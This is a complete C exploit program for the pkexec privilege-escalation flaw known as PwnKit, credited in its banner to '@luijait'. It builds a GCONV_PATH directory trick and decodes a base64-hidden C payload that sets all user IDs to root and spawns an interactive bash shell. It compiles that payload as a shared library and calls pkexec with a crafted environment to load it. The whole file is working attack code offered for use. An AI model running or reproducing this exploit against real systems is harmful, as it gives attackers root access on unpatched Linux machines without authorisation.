#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void banner()
{
setvbuf (stdout, NULL, _IONBF, 0);
printf("Exploit written by @luijait");
}

int main(int argc, char **argv)
{
banner();
system("mkdir 'GCONV_PATH=.' && touch 'GCONV_PATH=./tmp' && chmod +x 'GCONV_PATH=./tmp'");
system("mkdir tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCBnY29udih2b2lkKSB7fQoKCnZvaWQgZ2NvbnZfaW5pdCh2b2lkICpzdGVwKQp7CgkvL1Blcm1zIHNldHVpZCgwKTsgc2V0ZXVpZCgwKTsgc2V0Z2lkKDApOyBzZXRndWlkKDApOwoJc2V0cmV1aWQoMCwgMCwgMCk7CiAgICAJc2V0cmVnaWQoMCwgMCwgMCk7CgkKCS8vSW52b3F1ZSBTaGVsbAoJY2hhciAqIHNoZWxsW10gPSB7ICIvYmluL2Jhc2giLCAiLWkiLCBOVUxMIH07CgkvL0RlZmluZSBQYXRoCgljaGFyICogZW52X3ZhcnNbXSA9IHsgIlBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluIiwgTlVMTCB9OwoJZXhlY3ZlKHNoZWxsWzBdLCBzaGVsbCwgZW52X3ZhcnMpOwoJZXhpdCgwKTsgCn0K | base64 -d > tmp/b64load.c; gcc tmp/b64load.c -o tmp/pwnkit.so -shared -fPIC ");
system("echo bW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDIK | base64 -d > tmp/gconv-modules");
char * const args[] = {
NULL
};
char * const entorno[] = {"pwnkit.so:.", "PATH=GCONV_PATH=.", "SHELL=/random", "CHARSET=PWNKIT","GIO_USE_VFS=",NULL};
	printf("\n[+] Enjoy your root if exploit was completed succesfully\n");
	return execve("/usr/bin/pkexec", args, entorno);
}
